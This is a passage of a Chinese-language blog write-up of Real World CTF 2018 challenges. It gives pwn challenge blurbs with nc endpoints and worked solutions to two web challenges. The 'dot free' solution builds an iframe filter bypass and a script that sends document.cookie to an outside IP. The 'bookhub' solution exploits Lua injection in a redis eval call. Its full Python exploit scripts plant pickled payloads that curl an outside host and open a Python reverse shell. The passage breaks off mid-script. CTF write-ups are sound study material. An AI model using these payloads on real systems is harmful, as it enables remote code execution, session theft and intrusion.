 pwn.log.info(&quot;Archiving container: &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\">    with open(OUTFILE, &apos;w&apos;) as f:</span><br><span class=\"line\">        f.write(r.content)</span><br><span class=\"line\">        pwn.log.info(&quot;Flag written to file &apos;&#123;&#125;&apos;&quot;.format(OUTFILE))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><h3 id=\"state-of-the-art-vm\"><a href=\"#state-of-the-art-vm\" class=\"headerlink\" title=\"state-of-the-art vm\"></a>state-of-the-art vm</h3><p>description:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">Latest QEMU is unbreakable, and we also hardened it.</span><br><span class=\"line\"></span><br><span class=\"line\">NOTE: Host OS is Ubuntu 16.04</span><br><span class=\"line\"></span><br><span class=\"line\">Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/state-of-the-art_vm_ddde3799c4dc2936eb182ec3dbefdfef.zip</span><br><span class=\"line\"></span><br><span class=\"line\">nc 34.236.229.208 31338</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: Check start.sh</span><br></pre></td></tr></table></figure>\n<h3 id=\"Spectre-Free\"><a href=\"#Spectre-Free\" class=\"headerlink\" title=\"Spectre-Free\"></a>Spectre-Free</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">The spectre&apos;s paper told me that the vulnerability can only be used to achieve information discloure, while I don&apos;t care about infoleak. Why not use it to exchange superior performance?</span><br><span class=\"line\"></span><br><span class=\"line\">Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/togiveout.tgz.b5b489f104f50d9c5342ccf7180add5c</span><br><span class=\"line\"></span><br><span class=\"line\">http://34.236.229.208</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: If you are not a master of Spectre, maybe you can use some unpatched 1day bug.</span><br><span class=\"line\"></span><br><span class=\"line\">Hint 2: The spectre&apos;s patch happens to make certain bugs unable to be triggered. Hence Microsoft is lazy, so they may not even analyze or patch those bugs. Try to retrieve some unpatched 1 day bugs please.Also I found a tweet which may be related to this.</span><br></pre></td></tr></table></figure>\n<h3 id=\"kid-vm\"><a href=\"#kid-vm\" class=\"headerlink\" title=\"kid vm\"></a>kid vm</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn Writing a vm is the best way to teach kids to learn vm escape.</span><br><span class=\"line\"></span><br><span class=\"line\">Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/kid_vm_801180ca894848965a2d6424472e0acb.zip</span><br><span class=\"line\"></span><br><span class=\"line\">nc 34.236.229.208 9999</span><br></pre></td></tr></table></figure>\n<h3 id=\"p90-RUSH-B\"><a href=\"#p90-RUSH-B\" class=\"headerlink\" title=\"p90  RUSH B\"></a>p90  RUSH B</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">When Cloud9 won the Major at Boston in 2018, another war starts off the cyberspace. The CTF players who enthuse about CS:GO not only want to run inside the Dust2 but also &quot;&quot;run&quot;&quot; outside the map. There is a challenge for guys who don&apos;t wanna be stuck in jail. Have fun with the Counter-Strike :)</span><br><span class=\"line\"></span><br><span class=\"line\">Here is a readme for you https://www.dropbox.com/s/3nn5pwukg5mk6k6/readme.md?dl=0</span><br><span class=\"line\"></span><br><span class=\"line\">A CS:GO server template: https://www.dropbox.com/s/7v48wdctx83d1lw/CSGO_Server_5ea3610faacd5b3bae1e97e33927caaf.zip?dl=0</span><br></pre></td></tr></table></figure>\n<h3 id=\"untrustworthy\"><a href=\"#untrustworthy\" class=\"headerlink\" title=\"untrustworthy\"></a>untrustworthy</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">Don&apos;t trust everything you see. There are secrets hidden in plain sight.</span><br><span class=\"line\"></span><br><span class=\"line\">nc 18.211.57.236 13337</span><br><span class=\"line\"></span><br><span class=\"line\">https://s3-us-west-1.amazonaws.com/realworldctf/distrib.zip</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"dot-free\"><a href=\"#dot-free\" class=\"headerlink\" title=\"dot free\"></a>dot free</h3><ol>\n<li><p>ip2long</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip_addr=&apos;192.168.2.10&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"># transfer ip to int</span><br><span class=\"line\">def ip2long(ip):</span><br><span class=\"line\">    ip_list=ip.split(&apos;.&apos;)</span><br><span class=\"line\">    result=0</span><br><span class=\"line\">    for i in range(4):  #0,1,2,3</span><br><span class=\"line\">        result=result+int(ip_list[i])*256**(3-i)</span><br><span class=\"line\">    return result</span><br><span class=\"line\"></span><br><span class=\"line\">long=3232236042</span><br><span class=\"line\"></span><br><span class=\"line\"># transfer int to ip</span><br><span class=\"line\">def long2ip(long):</span><br><span class=\"line\">    floor_list=[]</span><br><span class=\"line\">    yushu=long</span><br><span class=\"line\">    for i in reversed(range(4)):   #3,2,1,0</span><br><span class=\"line\">        res=divmod(yushu,256**i)</span><br><span class=\"line\">        floor_list.append(str(res[0]))</span><br><span class=\"line\">        yushu=res[1]</span><br><span class=\"line\">    return &apos;.&apos;.join(floor_list)</span><br><span class=\"line\"></span><br><span class=\"line\">a=long2ip(long)</span><br><span class=\"line\">print(a)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>关键代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'message'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (e.data.iframe) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf(<span class=\"string\">'.'</span>) == <span class=\"number\">-1</span> &amp;&amp; e.data.iframe.value.indexOf(<span class=\"string\">\"//\"</span>) == <span class=\"number\">-1</span> &amp;&amp; e.data.iframe.value.indexOf(<span class=\"string\">\"。\"</span>) == <span class=\"number\">-1</span> &amp;&amp; e.data.iframe.value &amp;&amp; <span class=\"keyword\">typeof</span>(e.data.iframe != <span class=\"string\">'object'</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (e.data.iframe.type == <span class=\"string\">\"iframe\"</span>) &#123;</span><br><span class=\"line\">                    lce(doc, [<span class=\"string\">'iframe'</span>, <span class=\"string\">'width'</span>, <span class=\"string\">'0'</span>, <span class=\"string\">'height'</span>, <span class=\"string\">'0'</span>, <span class=\"string\">'src'</span>, e.data.iframe.value], parent);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    lls(e.data.iframe.value)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">ev</span>) </span>&#123;</span><br><span class=\"line\">        postMessage(<span class=\"built_in\">JSON</span>.parse(<span class=\"built_in\">decodeURIComponent</span>(location.search.substr(<span class=\"number\">1</span>))), <span class=\"string\">'*'</span>)</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">decodeURIComponent(location.search.substr(1))</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>bypass</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e.data.iframe.value.indexOf(&quot;//&quot;) == -1</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">http:/\\</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;.&quot; 和 &quot;。&quot;均不能使用</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">使用ip2long bypass</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%22http:\\u002f\\u005c2077186703:1234%22&#125;&#125;</span><br><span class=\"line\">或者不要`http:` =&gt;</span><br><span class=\"line\">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%20%22\\u002f\\u005c2077186703:1234/a%22&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>getflag</p>\n<p>index.html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.location=&quot;http://123.207.90.143?flag=&quot;+document.cookie;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rwctf%7BL00kI5TheFlo9%7D</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"bookhub\"><a href=\"#bookhub\" class=\"headerlink\" title=\"bookhub\"></a>bookhub</h3><ol>\n<li><p>测试登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your ip address isn&apos;t in the 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123.</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>进入代码查看</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def get_remote_addr():</span><br><span class=\"line\">    address = flask.request.headers.get(&apos;X-Forwarded-For&apos;, flask.request.remote_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    try:</span><br><span class=\"line\">        ipaddress.ip_address(address)</span><br><span class=\"line\">    except ValueError:</span><br><span class=\"line\">        return None</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return address</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>测试修改X-Forwarded-For，失败，原因: XFF做了反代理，伪造的 XFF被覆盖</p>\n</li>\n<li><p>打开 18.213.16.123:5000</p>\n<p>发现该服务运行于debug模式下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@login_required</span><br><span class=\"line\">@user_blueprint.route(&apos;/admin/system/refresh_session/&apos;, methods=[&apos;POST&apos;])</span><br><span class=\"line\">def refresh_session():</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">        delete all session except the logined user</span><br><span class=\"line\"></span><br><span class=\"line\">        :return: json</span><br><span class=\"line\">        &quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">        status = &apos;success&apos;</span><br><span class=\"line\">        sessionid = flask.session.sid</span><br><span class=\"line\">        prefix = app.config[&apos;SESSION_KEY_PREFIX&apos;]</span><br><span class=\"line\"></span><br><span class=\"line\">        if flask.request.form.get(&apos;submit&apos;, None) == &apos;1&apos;:</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                rds.eval(rf&apos;&apos;&apos;</span><br><span class=\"line\">                local function has_value (tab, val)</span><br><span class=\"line\">                    for index, value in ipairs(tab) do</span><br><span class=\"line\">                        if value == val then</span><br><span class=\"line\">                            return true</span><br><span class=\"line\">                        end</span><br><span class=\"line\">                    end</span><br><span class=\"line\">                </span><br><span class=\"line\">                    return false</span><br><span class=\"line\">                end</span><br><span class=\"line\">                </span><br><span class=\"line\">                local inputs = &#123;&#123; &quot;&#123;prefix&#125;&#123;sessionid&#125;&quot; &#125;&#125;</span><br><span class=\"line\">                local sessions = redis.call(&quot;keys&quot;, &quot;&#123;prefix&#125;*&quot;)</span><br><span class=\"line\">                </span><br><span class=\"line\">                for index, sid in ipairs(sessions) do</span><br><span class=\"line\">                    if not has_value(inputs, sid) then</span><br><span class=\"line\">                        redis.call(&quot;del&quot;, sid)</span><br><span class=\"line\">                    end</span><br><span class=\"line\">                end</span><br><span class=\"line\">                &apos;&apos;&apos;, 0)</span><br><span class=\"line\">            except redis.exceptions.ResponseError as e:</span><br><span class=\"line\">                app.logger.exception(e)</span><br><span class=\"line\">                status = &apos;fail&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        return flask.jsonify(dict(status=status))</span><br></pre></td></tr></table></figure>\n<p>上边这一段代码由于<code>@login_required</code> 写在route上边，所以存在未授权访问。</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180801194537.png\" alt=\"\"></p>\n</li>\n<li><p>添加csrf_token</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180801195906.png\" alt=\"\"></p>\n</li>\n<li><p>漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local inputs = &#123;&#123; &quot;&#123;prefix&#125;&#123;sessionid&#125;&quot; &#125;&#125;</span><br><span class=\"line\">local sessions = redis.call(&quot;keys&quot;, &quot;&#123;prefix&#125;*&quot;)</span><br></pre></td></tr></table></figure>\n<p>这里使用字符串拼接，存在问题，可以通过闭合双引号，使得redis执行恶意代码。</p>\n</li>\n<li><p>跟踪<code>{prefix}</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prefix = app.config[&apos;SESSION_KEY_PREFIX&apos;]</span><br><span class=\"line\"></span><br><span class=\"line\">app.config[&apos;SESSION_KEY_PREFIX&apos;] = &apos;bookhub:session:&apos;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>构造payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">af5e1a4c-23b2-4f87-abf6-96a60d61d8b3&quot;,redis evilcode,&quot;bookhub:session:tianji</span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123; &quot;bookhub:session:af5e1a4c-23b2-4f87-abf6-96a60d61d8b3&quot;,redis evilcode,&quot;bookhub:session:tianji&quot; &#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>参考文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</span><br><span class=\"line\">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>evil code</p>\n<blockquote>\n<p>redis.call(“set”,”bookhub:session:tianji”,反弹shell) </p>\n</blockquote>\n</li>\n<li><p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cPickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\">DEBUG = 0</span><br><span class=\"line\"></span><br><span class=\"line\">URL = &quot;http://18.213.16.123:5000/&quot; if not DEBUG else &quot;http://127.0.0.1:5000/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        listen_ip = &quot;123.207.90.143&quot;</span><br><span class=\"line\">        listen_port = 1234</span><br><span class=\"line\">        s = &quot;&quot;&quot;curl 123.207.90.143:1234&quot;&quot;&quot;</span><br><span class=\"line\">        return (os.system,(s,))</span><br><span class=\"line\"></span><br><span class=\"line\">e = exp()</span><br><span class=\"line\">s = cPickle.dumps(e)</span><br><span class=\"line\">s_bypass = &quot;&quot;</span><br><span class=\"line\">for i in s:</span><br><span class=\"line\">    s_bypass +=&quot;string.char(%s)..&quot;%ord(i)</span><br><span class=\"line\">evilcode = &apos;&apos;&apos;redis.call(&quot;set&quot;,&quot;bookhub:session:tianji&quot;,%s)&apos;&apos;&apos;%s_bypass[:-2]</span><br><span class=\"line\">payload = &apos;&apos;&apos;2047a141-2493-4f81-b315-8b8d95d3db33&quot;,%s,&quot;bookhub:session:tianji&apos;&apos;&apos;%evilcode</span><br><span class=\"line\">payload = payload.replace(&quot; &quot;,&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        &quot;Cookie&quot;: &apos;bookhub-session=%s&apos; % payload,</span><br><span class=\"line\">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class=\"line\">        &apos;X-CSRFToken&apos;: &apos;&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    print headers[&quot;Cookie&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">    res = requests.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">    if res.status_code == 200:</span><br><span class=\"line\">        html = res.content</span><br><span class=\"line\">        r = re.findall(r&apos;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&apos;, html)</span><br><span class=\"line\">        if r:</span><br><span class=\"line\">            headers[&apos;X-CSRFToken&apos;] = r[0]</span><br><span class=\"line\">            # refresh_session</span><br><span class=\"line\">            data = &#123;&apos;submit&apos;: &apos;1&apos;&#125;</span><br><span class=\"line\">            res = requests.post(URL + &apos;admin/system/refresh_session/&apos;,</span><br><span class=\"line\">                           data=data, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            # fuck</span><br><span class=\"line\">            headers[&apos;Cookie&apos;] = &apos;bookhub-session=tianji&apos;</span><br><span class=\"line\">            res = requests.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br></pre></td></tr></table></figure>\n<p>收到响应。</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180802110118.png\" alt=\"\"></p>\n</li>\n<li><p>修改payload，获取flag</p>\n<p>payload1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">import json</span><br><span class=\"line\">import random</span><br><span class=\"line\">import string</span><br><span class=\"line\">import cPickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\">req = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\">DEBUG = 0</span><br><span class=\"line\"></span><br><span class=\"line\">URL = &quot;http://18.213.16.123:5000/&quot; if not DEBUG else &quot;http://127.0.0.1:5000/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def rs(n=6):</span><br><span class=\"line\">    return &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, n))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        listen_ip = &quot;123.207.90.143&quot;</span><br><span class=\"line\">        listen_port = 1234</span><br><span class=\"line\">        s = &apos;python -c \\&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;%s&quot;,%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\\&apos;&apos; % (</span><br><span class=\"line\">            listen_ip, listen_port)</span><br><span class=\"line\">        return (os.system, (s,))</span><br><span class=\"line\"></span><br><span class=\"line\">x = [&#123;&apos;_fresh&apos;: False, &apos;_permanent&apos;: True,</span><br><span class=\"line\">      &apos;csrf_token&apos;: &apos;2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8&apos;, &apos;exp&apos;: exp()&#125;]</span><br><span class=\"line\">s = cPickle.dumps(x)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    payload = urllib.quote(s)</span><br><span class=\"line\">    yoursid = &apos;vvv&apos;</span><br><span class=\"line\">    funcode = r&quot;local function urlDecode(s) s = string.gsub(s, &apos;%%(%x%x)&apos;, function(h) return string.char(tonumber(h, 16)) end) return s end&quot;</span><br><span class=\"line\">    # 插入payload并防止del</span><br><span class=\"line\">    sid = &apos;%s\\\\&quot; &#125; %s &apos; % (rs(6), funcode) + \\</span><br><span class=\"line\">        